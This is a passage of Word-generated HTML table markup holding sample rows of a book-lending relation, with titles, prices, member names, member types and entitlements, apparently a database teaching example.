align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Member_ Name<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"114\" valign=\"top\" style=\"width:85.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Member_type,<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Entailment<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"74\" valign=\"top\" style=\"width:55.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">101<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"93\" valign=\"top\" style=\"width:69.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Computer Networks<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"66\" valign=\"top\" style=\"width:49.8pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">400<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"70\" valign=\"top\" style=\"width:52.65pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">CS11<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"82\" valign=\"top\" style=\"width:61.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Ravi K<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"114\" valign=\"top\" style=\"width:85.15pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Faculty<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">5<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"74\" valign=\"top\" style=\"width:55.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">102<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"93\" valign=\"top\" style=\"width:69.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Operating Systems<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"66\" valign=\"top\" style=\"width:49.8pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">700<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"70\" valign=\"top\" style=\"width:52.65pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">CS11<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"82\" valign=\"top\" style=\"width:61.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Ravi K<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"114\" valign=\"top\" style=\"width:85.15pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Faculty<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">5<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"74\" valign=\"top\" style=\"width:55.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">103<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"93\" valign=\"top\" style=\"width:69.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">System Software<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"66\" valign=\"top\" style=\"width:49.8pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">300<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"70\" valign=\"top\" style=\"width:52.65pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">CS12<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"82\" valign=\"top\" style=\"width:61.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Shyam Sundar<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"114\" valign=\"top\" style=\"width:85.15pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Student<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">4<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"74\" valign=\"top\" style=\"width:55.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">104<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"93\" valign=\"top\" style=\"width:69.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Software Engineering<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"66\" valign=\"top\" style=\"width:49.8pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">450<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"70\" valign=\"top\" style=\"width:52.65pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">CS14<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"82\" valign=\"top\" style=\"width:61.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Venkatesh<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"114\" valign=\"top\" style=\"width:85.15pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Student<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">4<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"74\" valign=\"top\" style=\"width:55.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">105<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"93\" valign=\"top\" style=\"width:69.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Data Base Systems<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"66\" valign=\"top\" style=\"width:49.8pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">750<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"70\" valign=\"top\" style=\"width:52.65pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">CS12<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"82\" valign=\"top\" style=\"width:61.45pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Shyam Sundar<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"114\" valign=\"top\" style=\"width:85.15pt;border-top:none;border-left:\r\n  none;border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Student<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"85\" valign=\"top\" style=\"width:63.5pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  